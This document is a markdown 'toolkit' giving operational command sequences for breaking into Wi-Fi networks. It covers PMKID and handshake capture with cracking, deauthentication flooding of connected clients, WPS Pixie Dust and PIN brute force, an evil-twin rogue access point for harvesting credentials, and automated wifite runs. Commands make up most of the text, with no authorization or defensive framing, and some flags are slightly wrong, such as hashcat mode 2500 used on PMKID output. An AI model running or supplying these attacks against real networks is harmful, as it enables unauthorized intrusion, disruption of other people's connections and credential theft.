# Ultimate Wi-Fi Access Testing & Bypass Toolkit

Comprehensive compilation of all operational methods, tools, and execution steps for wireless network assessment and connection recovery.

---

## 1. PMKID Attack (Clientless WPA2/WPA3 Hash Extraction)
*Best for targeting access points without requiring active connected clients.*

### Required Tools:
- `hcxtools` (`hcxdumptool`, `hcxpcapngtool`)
- `hashcat` or `aircrack-ng`

### Operational Steps:
1. Put wireless interface into monitor mode:
   ```bash
   ip link set wlan0 down
   iwconfig wlan0 mode monitor
   ip link set wlan0 up
   ```
2. Capture PMKID frames from the target AP:
   ```bash
   hcxdumptool -i wlan0 -o pmkid_dump.pcapng --enable_status=1
   ```
3. Convert the captured pcapng file into hash format:
   ```bash
   hcxpcapngtool -o wifi_hash.hccapx pmkid_dump.pcapng
   ```
4. Crack the hash using GPU-accelerated hashcat or aircrack-ng:
   ```bash
   hashcat -m 2500 -a 0 wifi_hash.hccapx wordlist.txt
   # OR
   aircrack-ng -w wordlist.txt wifi_hash.hccapx
   ```

---

## 2. Classic 4-Way Handshake Capture & Deauth Flood
*Requires active clients connected to the target AP.*

### Required Tools:
- `aircrack-ng` suite (`airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`)

### Operational Steps:
1. Kill conflicting services and start monitor mode:
   ```bash
   airmon-ng check kill
   airmon-ng start wlan0
   ```
2. Monitor specific AP and channel:
   ```bash
   airodump-ng --bssid [BSSID] --channel [CHANNEL] wlan0mon
   ```
3. Flood the client with deauthentication frames to force re-connection handshake:
   ```bash
   aireplay-ng --deauth 0 -a [BSSID] -c [CLIENT_MAC] wlan0mon
   ```
4. Verify handshake capture on airodump-ng display, then crack:
   ```bash
   aircrack-ng -w wordlist.txt -b [BSSID] capture-01.cap
   ```

---

## 3. WPS Pixie Dust & PIN Brute-Force Attack
*Targets routers with vulnerable Wi-Fi Protected Setup (WPS) implementations.*

### Required Tools:
- `reaver` or `bully`

### Operational Steps:
1. Check WPS status of targets:
   ```bash
   wash -i wlan0mon
   ```
2. Execute Pixie Dust offline WPS attack (instantaneous if vulnerable):
   ```bash
   reaver -i wlan0mon -b [BSSID] -K 1 -vv
   ```
3. Fallback to active PIN brute-force if Pixie Dust fails:
   ```bash
   reaver -i wlan0mon -b [BSSID] -vv
   ```

---

## 4. Evil Twin & Rogue Access Point Attack
*Creates a duplicate access point to harvest WPA pre-shared keys or captive portal credentials.*

### Required Tools:
- `hostapd`, `dnsmasq`, `airgeddon`

### Operational Steps:
1. Configure a rogue AP configuration file (`hostapd.conf`) matching target SSID and channel.
2. Launch rogue AP and captive DNS redirect server.
3. Deauthenticate clients from the legitimate AP so they automatically connect to the rogue AP.
4. Capture authentication attempts or present a credential collection interface.

---

## 5. All-in-One Automated Frameworks (`Wifite` & `Airgeddon`)
*Automates the entire sequence from scanning to handshake capture and cracking.*

### Required Tools:
- `wifite`

### Operational Steps:
```bash
wifite --kill --dict wordlist.txt
```
